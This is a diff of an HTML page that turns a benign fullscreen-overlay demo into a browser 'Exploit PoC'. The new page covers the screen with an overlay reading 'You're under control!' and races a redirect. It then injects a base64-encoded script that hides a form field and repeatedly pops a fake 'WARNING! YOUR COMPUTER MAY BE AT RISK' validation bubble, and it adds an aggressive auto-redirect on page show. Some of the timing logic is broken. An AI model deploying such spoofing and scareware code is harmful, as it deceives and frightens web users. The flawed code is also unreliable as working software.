@@ -1,91 +1,111 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Fullscreen Overlay PoC</title>
+  <meta charset="utf-8">
+  <title>Exploit PoC - Fullscreen Overlay</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden; /* Mencegah scroll */
+      font-family: Arial, sans-serif;
+    }
 
-<style>
-html, body {
-  width: 100%;
-  height: 100%;
-  margin: 0;
-  overflow: hidden;
-  font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif;
-}
+    /* FULLSCREEN OVERLAY STYLES */
+    #overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.95); /* Warna overlay */
+      display: none; /* Default tidak ditampilkan */
+      z-index: 9999;
+      color: white;
+      text-align: center;
+      font-size: 36px;
+      font-weight: bold;
+      justify-content: center;
+      align-items: center;
+    }
 
-/* FULLSCREEN OVERLAY */
-#overlay {
-  position: fixed;
-  inset: 0; /* top:0 right:0 bottom:0 left:0 */
-  background: rgba(0,0,0,0.96);
-  z-index: 2147483647;
+    #overlay p {
+      margin-bottom: 30px;
+    }
 
-  display: none;
-  align-items: center;
-  justify-content: center;
+    #overlay button {
+      padding: 12px 24px;
+      font-size: 20px;
+      background-color: #ff0000;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      border-radius: 6px;
+    }
 
-  color: white;
-  text-align: center;
-  padding: env(safe-area-inset-top)
-           env(safe-area-inset-right)
-           env(safe-area-inset-bottom)
-           env(safe-area-inset-left);
-}
-
-#overlay-content {
-  max-width: 90%;
-}
-
-#overlay h1 {
-  font-size: 36px;
-  margin-bottom: 20px;
-}
-
-#overlay p {
-  font-size: 18px;
-  opacity: 0.9;
-}
-
-#overlay button {
-  margin-top: 30px;
-  padding: 12px 24px;
-  font-size: 18px;
-  border: none;
-  background: #ff4444;
-  color: white;
-  border-radius: 6px;
-  cursor: pointer;
-}
-</style>
+    #overlay button:hover {
+      background-color: #cc0000;
+    }
+  </style>
 </head>
 
 <body>
 
-<button onclick="showOverlay()">Trigger PoC</button>
+<button onclick="triggerOverlay()">GO</button>
 
+<!-- Fullscreen Overlay Panel -->
 <div id="overlay">
-  <div id="overlay-content">
-    <h1>Fullscreen UI Overlay</h1>
-    <p>Visual spoofing demonstration for security report</p>
-    <button onclick="hideOverlay()">Close</button>
+  <div>
+    <p>You're under control!</p>
+    <button onclick="closeOverlay()">Close</button>
   </div>
 </div>
 
 <script>
-function showOverlay() {
-  document.getElementById('overlay').style.display = 'flex';
-}
+  let redirectTimeout, redirectCheck;
 
-function hideOverlay() {
-  document.getElementById('overlay').style.display = 'none';
-}
+  function triggerOverlay() {
+    // Menampilkan overlay fullscreen
+    document.getElementById('overlay').style.display = 'flex';
 
-/* OPTIONAL: auto-trigger after page load (good for video PoC) */
-// window.onload = () => {
-//   setTimeout(showOverlay, 800);
-// };
+    // Triggering the redirect and race conditions
+    redirectTimeout = setTimeout(() => {
+      document.location = "http://www.google.com";  // Faster redirect after 1 second
+    }, 1000);
+
+    // Interval aggressive check to handle redirect race
+    redirectCheck = setInterval(checkRedirect, 10);
+  }
+
+  function checkRedirect() {
+    try {
+      redirectTimeout.location.href;  // Checking location change
+    } catch (e) {
+      clearInterval(redirectCheck); // Stop checking once redirect is successful
+
+      // Injecting the payload as soon as the redirect is blocked
+      setTimeout(() => {
+        document.write(atob('PHN0eWxlPgojYWFhewpwb3NpdGlvbjphYnNvbHV0ZTsKbGVmdDozNSU7Cn0KI2JiYnsKZGlzcGxheTpub25lOwp9Cjwvc3R5bGU+CjxzY3JpcHQ+CmZ1bmN0aW9uIHRlc3QoKXsKYWFhID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImFhYSIpOwphYWEuc3R5bGUub3BhY2l0eSA9ICcwJzsKYWFhLm9uaW52YWxpZCA9IGZ1bmN0aW9uIChlKSB7CmUudGFyZ2V0LnNldEN1c3RvbVZhbGlkaXR5KCJXQVJOSU5HIVxuWU9VUiBDT01QVVRFUiBNQVkgQkUgQVQgUklTSyIpOwp9OwpzZXRJbnRlcnZhbCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JiYicpLmNsaWNrKCkiLDEwMDApOwp9Cjwvc2NyaXB0Pgo8Zm9ybT4KICAgIDxpbnB1dCBwbGFjZWhvbGRlcj0iYWFhIiByZXF1aXJlZCBpZD0iYWFhIiAvPgogICAgPGlucHV0IGlkPSdiYmInIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0Ij4KPC9mb3JtPg=='));
+        test();  // Make sure the injected code works (can be replaced)
+      }, 500);  // Inject payload after 0.5 seconds
+    }
+  }
+
+  // Function to close the overlay
+  function closeOverlay() {
+    document.getElementById('overlay').style.display = 'none';  // Hide overlay
+  }
+
+  // Optional: auto-trigger page redirection
+  window.addEventListener('pageshow', () => {
+    requestAnimationFrame(() => {
+      requestAnimationFrame(() => {
+        setTimeout(() => {
+          location.href = 'https://google.com:9090';  // Aggressive redirect (alternative)
+        }, 100);  // 100ms delay for quicker timing
+      });
+    });
+  });
 </script>
 
 </body>
-</html>
